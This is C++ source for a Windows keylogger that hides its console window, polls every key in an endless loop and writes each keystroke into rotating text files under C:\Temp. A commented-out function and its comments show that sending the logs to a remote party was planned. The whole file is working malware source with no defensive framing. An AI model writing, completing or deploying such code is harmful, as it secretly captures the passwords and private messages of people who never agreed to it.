#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include<string.h>
#include<stdlib.h>
using namespace std;

void file_name(char *old, int cnt);
void txt_reset();
int Save(int key_stroke, char *file);
void Stealth();

int main()
{
	char i, *mac_address = "00:03:FF"; // A function that accepts a Mac address is being implemented
	int textcnt = 0, notepadcnt = 0; // We implemented 10 temporary text files
	char txtname[14] = "C:\\Temp\\0.txt";
	Stealth();
	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) {
				textcnt++;
				Save(i, txtname);
				if (textcnt > 15) // More than 15 characters
				{
					notepadcnt++;
					textcnt = 0;
					//send_textfile(mac_address, txtname); //A function to send and receive Mac addresses and txt names is being implemented
					if (notepadcnt >= 10) // More than 10 txtfile
					{ 
						notepadcnt = 0;
						txt_reset();
					}
					strcpy(txtname, "C:\\Temp\\0.txt");
					file_name(txtname, notepadcnt);
				}
			}
		}
	}
	system("PAUSE");
	return 0;
}

void file_name(char *tname, int ncnt) //change notepad name, example 0.txt 1.txt ... 9.txt
{
	char *tfile_num = &tname[8];
	for (int ti = 0; ti < ncnt; ti++)
		(*tfile_num)++;
}

void txt_reset() //Initialize the contents of Notepad
{
	char *tname = "C:\\Temp\\0.txt";
	char *tfile_num = &tname[8];
	for (int ti = 0; ti < 10; ti++)
	{
		FILE *tf = fopen(tname, "w+");
		if (!tf)
			return;
		fclose(tf);
		(*tfile_num)++;
	}
}

int Save(int key_stroke, char *file) //Save the text in Notepad
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose(OUTPUT_FILE);
	return 0;
}
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}